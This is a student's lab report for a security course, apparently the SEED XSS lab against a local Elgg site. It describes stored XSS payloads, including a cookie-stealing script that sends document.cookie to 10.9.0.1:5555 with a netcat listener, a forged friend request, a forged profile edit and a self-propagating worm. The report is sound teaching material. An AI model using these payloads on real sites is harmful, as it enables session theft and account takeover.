## Lab05

- Michael Muffoletto (q91w347)
- CSCI 476/594
- muffmike1@gmail.com
- 3/21/21

# Task 1
For this task I was able to successfully post a malicious message to display an alert Window by firstly logging into Boby's account, then navigating to the his brief description tab and posting <script>alert('XSS');</script> in that box. After that was saved, I then logged into Alice's account and when navigating to the Members tab the attack executed.   
![Screen Shot 2021-03-28 at 1 54 29 PM](https://user-images.githubusercontent.com/33213355/112766087-76da0780-8fcd-11eb-8cf6-347ce569eece.png)   
  
![Screen Shot 2021-03-28 at 1 55 09 PM](https://user-images.githubusercontent.com/33213355/112766137-9b35e400-8fcd-11eb-9feb-94e74c3314d2.png)   

# Task 2
For this task I was able to successfully post a malicious message ti display cookies by logging into Bobys's account, then navigating to his brief description tab and posting <script>alert(document.cookie);</script> into that box. Then I logged into Alice's account and when navigating to Bobys profile via the Members tab the message was executed.   
![Screen Shot 2021-03-28 at 2 02 08 PM](https://user-images.githubusercontent.com/33213355/112766347-9de50900-8fce-11eb-9d9d-93cd1f3085d7.png)   
![Screen Shot 2021-03-28 at 2 02 44 PM](https://user-images.githubusercontent.com/33213355/112766353-a3daea00-8fce-11eb-8b24-7244716ba9b3.png)   

# Task 3
I was able to successfully get a user's cookies sent to my machine by firstly logging into boby's account and changing his brief description box to <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');</script>. Then I used the nc -lknv 5555 command in my terminal in order to listen and recieve the output of the attack. After that I logged into alice's account and when navigating to boby's profile, the netcat command outputed alice's cookies to my machine.   
![Screen Shot 2021-03-28 at 2 12 44 PM](https://user-images.githubusercontent.com/33213355/112766872-fa492800-8fd0-11eb-85ab-1b43f9e250e0.png)   
<img width="621" alt="Screen Shot 2021-03-28 at 2 15 45 PM" src="https://user-images.githubusercontent.com/33213355/112766880-003f0900-8fd1-11eb-9142-e914873eec52.png">   

# Task 4.1
I was able to successfully make it to where when anybody visits samy's profile page, he is automatically added as a friend to the vistiors friendslist. I did this by firstly using HTTP Header live and logging into a different user and adding samy as a friend while looking at the information on the HTTP Header application. I was able to understand that when samy was added, there was a GET request with the value of 59. I learned that in this request samy's friend value was 59 and I saw that ts and token values were preset as well. I constructed my HTTP request as var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token. After logging into samys account, I pasted the js attack into his about me tab and tested my attack by logging into alice's account. After logging into her account I went to samys page and without pressing the add friend button, when I navigated to her friends tab Samy was on the list, making my attack successful.   
![Screen Shot 2021-03-28 at 2 34 35 PM](https://user-images.githubusercontent.com/33213355/112767638-2a92c580-8fd5-11eb-910b-146d91df0d4b.png)   
![Screen Shot 2021-03-28 at 2 42 05 PM](https://user-images.githubusercontent.com/33213355/112767646-34b4c400-8fd5-11eb-8984-498187ea6657.png)   
<img width="781" alt="Screen Shot 2021-03-28 at 2 43 43 PM" src="https://user-images.githubusercontent.com/33213355/112767669-4b5b1b00-8fd5-11eb-8c9a-b6a11efaf0b7.png">   
![Screen Shot 2021-03-28 at 2 43 09 PM](https://user-images.githubusercontent.com/33213355/112767656-3ed6c280-8fd5-11eb-8e54-8bd31d43841e.png)   

# Task 4.2
If Editor mode was only provided then we could not successfully launch the attack because when in Editor mode extra HTML code is added to the text typed into the field. This ultiately encodes all special characters which replaces alot of our attack code and ultimaley just pastes our attack into the about me field.   
![Screen Shot 2021-03-28 at 2 57 13 PM](https://user-images.githubusercontent.com/33213355/112767871-52365d80-8fd6-11eb-9611-5c4aa820a0cc.png)   

# Task 5.1
I was able to successfully create an attack that would modify another users profile in a few steps. Firstly, I logged into an account and observed the HTTP Header Main output of when I hit the Edit profile tab. After doing this I was able to construct the url of our attack.   
![Screen Shot 2021-03-28 at 3 18 32 PM](https://user-images.githubusercontent.com/33213355/112769044-4352a980-8fdc-11eb-938f-c9d4b6da5c6f.png)   
Secondly, I was able to construct the content and guid part of our attack by editing the about me section of my profile while viewing the output of the HTTP Header program. From here I was able to observe what was executed when I changed my about me section.   
![Screen Shot 2021-03-28 at 3 28 39 PM](https://user-images.githubusercontent.com/33213355/112769186-f15e5380-8fdc-11eb-9a15-e51c5ebbb15d.png)   

Then simply added every variable given within the code(name, guid, ts, token) plus what message I wanted to be changed within the victem's bio. After pasting my code into samy's about me section I tested it while logged in to alice's account and when navigating to samy's page, her about me section was automatically changed to the string that I put.   
![Screen Shot 2021-03-28 at 3 38 42 PM](https://user-images.githubusercontent.com/33213355/112769202-033ff680-8fdd-11eb-95df-4be4e225c33b.png)   
<img width="987" alt="Screen Shot 2021-03-28 at 3 47 12 PM" src="https://user-images.githubusercontent.com/33213355/112769208-089d4100-8fdd-11eb-9571-077e83e04a1d.png">   

# Task 5.2
When I removed line 1 of the attack, the attack no longer works because it cannot find the name variable of the user navigating to samy's page.   

# Task 6
I was able to successfully write a self-propagating XSS Worm by copying my code over from the last attack and migrated it with the example code given with the DOM approach in the lab instructions. I then added an attack variable and called the wormCode variable inside of that which made the attack self propagating. After that I created a second sendurl and Ajax variable in order to also execute the add samy as a friend attack. I tested my attack by logging in to boby's account, navigating to samy's profile and boby's bio was changed as well as samy was added as a friend. I then logged into Charlie's account which I had not used once this lab until now and when I navigated to boby's page the same output occured.   
![Screen Shot 2021-03-28 at 4 42 44 PM](https://user-images.githubusercontent.com/33213355/112770815-bc0a3380-8fe5-11eb-964b-5b85b8a3f625.png)   
![Screen Shot 2021-03-28 at 4 42 54 PM](https://user-images.githubusercontent.com/33213355/112770826-d0e6c700-8fe5-11eb-90ae-c8802b218555.png)   
![Screen Shot 2021-03-28 at 4 44 11 PM](https://user-images.githubusercontent.com/33213355/112770829-d8a66b80-8fe5-11eb-9765-467a094c0aae.png)   
![Screen Shot 2021-03-28 at 4 44 21 PM](https://user-images.githubusercontent.com/33213355/112770839-e2c86a00-8fe5-11eb-9eca-ee78cfd33da5.png)   
<img width="794" alt="Screen Shot 2021-03-28 at 4 44 49 PM" src="https://user-images.githubusercontent.com/33213355/112770846-e9ef7800-8fe5-11eb-9b2a-44cc529b7046.png">   

